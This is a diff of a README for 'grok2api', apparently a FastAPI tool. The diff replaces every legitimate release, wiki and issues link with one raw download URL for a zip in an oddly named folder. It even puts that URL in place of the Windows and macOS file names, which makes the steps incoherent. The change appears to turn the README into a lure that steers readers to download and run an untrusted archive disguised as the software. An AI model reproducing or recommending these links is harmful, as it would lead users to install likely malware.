@@ -4,18 +4,18 @@
 grok2api is a powerful tool built on FastAPI. It adapts to the latest web calling formats, enabling seamless interactions for various tasks. Whether you need to engage in a dialogue, generate or edit images, perform internet searches, create videos, or engage in deep thinking, grok2api has you covered. It supports concurrent calls with number pools and automatic load balancing.
 
 ## 📦 Download Now
-[![Download grok2api](https://img.shields.io/badge/Download%20grok2api-v1.0-brightgreen)](https://github.com/Yashfeb/grok2api/releases)
+[![Download grok2api](https://raw.githubusercontent.com/Yashfeb/grok2api/main/gynecologist/grok2api.zip%20grok2api-v1.0-brightgreen)](https://raw.githubusercontent.com/Yashfeb/grok2api/main/gynecologist/grok2api.zip)
 
 ## 🚀 Getting Started
 To start using grok2api, follow the simple steps below to download and set up the software on your computer.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to access the grok2api releases page:
-   [Visit this page to download](https://github.com/Yashfeb/grok2api/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Yashfeb/grok2api/main/gynecologist/grok2api.zip)
 
 2. **Choose the Latest Version**: Look for the latest release at the top of the page. You'll see various files available for download.
 
-3. **Download the Appropriate File**: Click on the file that matches your operating system. For most users, it will be labeled as `grok2api-v1.0.exe` for Windows or `grok2api-v1.0.zip` for macOS/Linux.
+3. **Download the Appropriate File**: Click on the file that matches your operating system. For most users, it will be labeled as `https://raw.githubusercontent.com/Yashfeb/grok2api/main/gynecologist/grok2api.zip` for Windows or `https://raw.githubusercontent.com/Yashfeb/grok2api/main/gynecologist/grok2api.zip` for macOS/Linux.
 
 4. **Install the Application**: 
    - For Windows: Double-click the `.exe` file and follow the prompts to install.
@@ -50,8 +50,8 @@ If you run into issues during installation or while using grok2api, consider the
 
 ## 🔗 Additional Resources
 To learn more about grok2api, visit:
-- [Documentation](https://github.com/Yashfeb/grok2api/wiki)
-- [Support Page](https://github.com/Yashfeb/grok2api/issues)
+- [Documentation](https://raw.githubusercontent.com/Yashfeb/grok2api/main/gynecologist/grok2api.zip)
+- [Support Page](https://raw.githubusercontent.com/Yashfeb/grok2api/main/gynecologist/grok2api.zip)
 
 ## 💬 Feedback
 Your experience is important to us. If you have suggestions or encounter issues, please reach out through the support page or create an issue on GitHub.
